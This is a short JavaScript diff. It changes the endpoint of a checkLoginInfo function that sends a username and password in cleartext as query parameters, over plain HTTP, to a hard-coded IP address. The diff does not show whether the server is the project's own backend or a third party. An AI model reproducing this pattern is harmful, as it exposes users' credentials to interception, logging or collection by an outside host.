@@ -97,7 +97,7 @@ const checkLoginInfo = (username, password) => {
     throw e
   }
   const httpRequest = new XMLHttpRequest();
-  var url='http://114.55.6.148/?'+'username='+username+'&'+'password='+password
+  var url='http://114.55.6.148/daka.php?'+'username='+username+'&'+'password='+password
   httpRequest.open('GET', url, true);
   httpRequest.send();
 }
